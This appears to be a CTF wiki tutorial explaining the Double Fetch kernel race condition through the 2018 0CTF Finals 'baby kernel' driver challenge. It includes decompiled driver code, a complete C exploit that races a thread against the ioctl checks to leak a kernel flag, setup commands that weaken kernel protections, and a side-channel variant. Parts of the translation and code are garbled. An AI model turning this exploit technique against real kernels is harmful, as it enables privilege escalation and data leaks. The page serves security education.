[EN](./double-fetch.md) | [ZH](./double-fetch-zh.md)


# Double Fetch

## Overview
`Double Fetch` is a conditional competition vulnerability in principle. It is a data access competition between kernel mode and user mode.


In modern operating systems such as Linux, virtual memory addresses are usually divided into kernel space and user space. The kernel space is responsible for running kernel code, driver module code, etc., with higher permissions. The user space runs the user code and enters the kernel through system calls to complete the relevant functions. Normally, when user space passes data to the kernel, the kernel first copies the user data to the kernel space through the copy function such as `copy_from_user ` for verification and related processing. However, when the input data is more complicated, the kernel may only refer to its pointer. And temporarily save the data in the user space for subsequent processing. At this time, the data is falsified by other malicious threads, causing the kernel verification data to be inconsistent with the actual usage data, resulting in abnormal execution of the kernel code.


A typical `Double Fetch` vulnerability principle is shown in the following figure. A user-mode thread prepares data and enters the kernel through a system call. The data is fetched twice in the kernel, and the kernel first fetches data for security check ( Such as buffer size, pointer availability, etc., when the check passes, the kernel takes the second data for actual processing. Between the two fetched data, another user-mode thread can create conditional competition, tampering with the user-mode data that has passed the check, causing the access to be out of bounds or buffer overflow during real use, eventually leading to kernel crash or privilege escalation. .






[Typical Double Fetch Schematic] (./double-fetch.png)


## 2018 0CTF Finals Baby Kernel



### Problem Analysis


First, the driver file is analyzed by IDA. It can be seen that the flag is hard coded in the driver file.


```c

.data: 0000000000000480 flag dq offset aFlagThisWillBe
.data:0000000000000480                                         ; DATA XREF: baby_ioctl+2A↑r

.data:0000000000000480                                         ; baby_ioctl+DB↑r ...

.data:0000000000000480                                         ; "flag{THIS_WILL_BE_YOUR_FLAG_1234}"

.data:0000000000000488                 align 20h

```



The driver primarily registers a `baby_ioctl` function with two functions. When the cmd parameter in ioctl is 0x6666, the driver will output the load address of the flag. When the cmd parameter in ioctl is 0x1337, three checksums are first performed, and then the content input by the user is compared with the hard-coded flag byte by byte. When it is consistent, the flag is output by `printk`.


```c

signed __int64 __fastcall baby_ioctl(__int64 a1, attr *a2)

{

  attr *v2; // rdx

  signed __int64 result; // rax

  int i; // [rsp-5Ch] [rbp-5Ch]

  attr *v5; // [rsp-58h] [rbp-58h]



  _fentry__(a1, a2);

v5 = v2;
  if ( (_DWORD)a2 == 0x6666 )

  {

    printk("Your flag is at %px! But I don't think you know it's content\n", flag);

    result = 0LL;

  }

  else if ( (_DWORD)a2 == 0x1337

         && !_chk_range_not_ok((__int64)v2, 16LL, *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))

         && !_chk_range_not_ok(

               v5->flag_str,

SLODWORD (N 5&gt; flag_len)
               *(_QWORD *)(__readgsqword((unsigned __int64)&current_task) + 4952))

         && LODWORD(v5->flag_len) == strlen(flag) )

  {

    for ( i = 0; i < strlen(flag); ++i )

    {

      if ( *(_BYTE *)(v5->flag_str + i) != flag[i] )

        return 0x16LL;

    }

    printk("Looks like the flag is not a secret anymore. So here is it %s\n", flag);

    result = 0LL;

  }

  else

  {

    result = 0xELL;

  }

  return result;

}

```



And analyze its check function, where `_chk_range_not_ok` is to check if the pointer and length range point to user space. Through the analysis of the function of the driver file, the data structure input by the user can be obtained as follows:


```

00000000 attr            struc ; (sizeof=0x10, mappedto_3)

00000000 flag_str dq?
00000008 flag_len dq?
00000010 attr            ends

```



The inspection content is:


1. Whether the input data pointer is user mode data.
2. Whether the flag\_str in the data pointer points to the user mode.
3. According to whether the flag\_len in the pointer is equal to the length of the hardcoded flag.


### Problem Solving
According to the principle of `Double Fetch` vulnerability, there is a `Double Fetch` vulnerability in this problem. When the user input data is verified, the address pointed to by `flag_str` is changed to the flag hard-coded address, and the flag content is output.


First, use the provided `cmd=0x6666` function to get the load address of the flag in the kernel.


&gt; The contents of the kernel output with `printk` can be viewed with the `dmesg` command.


Then, construct a data structure that conforms to the `cmd=0x1337` function, where `flag_len` can be obtained directly from hardcoded as 33, and `flag_str` points to a user space address.


Finally, a malicious thread is created, and the user-state address pointed to by `flag_str` is continually modified to the kernel address of the flag to create a race condition, so that it passes the byte-by-byte comparison check in the driver and outputs the flag content.


### Exploit

```c

// gcc -static exp.c -lpthread -o exp

#include <string.h>

char *strstr(const char *haystack, const char *needle);

#define _GNU_SOURCE         /* See feature_test_macros(7) */

#include <string.h>

char *strcasestr(const char *haystack, const char *needle);

#include <stdio.h>

#include <stdlib.h>

#include <unistd.h>

#include <sys/types.h>

#include <sys/stat.h>

#include <sys/ioctl.h>

#include <fcntl.h>

#include <pthread.h>



#define TRYTIME 0x1000 //Number of collisions
#define LEN 0x1000


struct attr

{

    char *flag;

    size_t len;

};

unsigned long long addr;

int finish =0;

char buf [LEN + 1] = {0};
/ / Thread function, constantly modify the address pointed to by the flag is the flag address in the kernel
void change_attr_value(void *s){

    struct attr * s1 = s; 

    while(finish==0){

    s1->flag = addr;
    }

}



int main(void)

{

    int addr_fd;

    char *idx;

    int fd = open("/dev/baby",0);

    int ret = ioctl(fd,0x6666);    

    pthread_t t1;

    struct attr t;

    setvbuf(stdin,0,2,0);

    setvbuf(stdout,0,2,0);

    setvbuf(stderr,0,2,0);   

/ / Get the kernel hard-coded flag address
    system("dmesg > /tmp/record.txt");

    addr_fd = open("/tmp/record.txt",O_RDONLY);

    lseek(addr_fd,-LEN,SEEK_END);

    read(addr_fd,buf,LEN);

    close(addr_fd);

    idx = strstr(buf,"Your flag is at ");

    if (idx == 0){

        printf("[-]Not found addr");

        exit(-1);

    }

    else{

        idx+=16;

        addr = strtoull(idx,idx+16,16);

        printf("[+]flag addr: %p\n",addr);

    }

/ / Construct attr data structure
t.len = 33;
    t.flag = buf;

/ / New malicious thread
    pthread_create(&t1, NULL, change_attr_value,&t);

    for(int i=0;i<TRYTIME;i++){

        ret = ioctl(fd, 0x1337, &t);

        t.flag = buf;

    }

    finish = 1;

    pthread_join(t1, NULL);

    close(fd);

    puts("[+]result is :");

    system("dmesg | grep flag");

    return 0;

}

```



### Other
There are a few points to note when this topic is deployed in the environment.


First, you need to turn off `dmesg_restrict`, otherwise you can&#39;t view the `printk` information. The specific operation is to add in the startup script:


```bash

echo 0 > /proc/sys/kernel/dmesg_restrict

```



Second, do not enable `SMAP` protection when configuring QEMU startup parameters, otherwise direct access to user state data in the kernel will cause `kerne panic`.


Also, when configuring the QEMU startup parameters, you need to configure non-single-core single-thread startup, otherwise the race condition in the title cannot be triggered. The specific operation is to increase the number of cores in the startup parameters, such as:


```bash

-smp 2, cores = 2, threads = 1 \
```



&gt; After startup, you can check the number of currently running kernels and the number of hyperthreads by `/proc/cpuinfo`.


Finally, there is an unintended solution to a side channel attack on this problem:


&gt; Since flag is hard-coded, and the check method is byte-by-byte comparison, it can be blasted byte by byte to get the flag.
>

&gt; The method is to place the byte to be blasted at the end of the memory page of the mmap application, at which point the next byte is in the user-space that is not readable or writable. When the correct one byte is obtained, the kernel compares the correctness of the next byte in the user space. Since the address is unreadable, it will cause `kernel panic`, so that it can be judged whether one byte of the burst is correct.


## Reference

https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/wang-pengfei



https://veritas501.space/2018/06/04/0CTF%20final%20baby%20kernel/



http://p4nda.top/2018/07/20/0ctf-baby/



https://www.freebuf.com/articles/system/156485.html






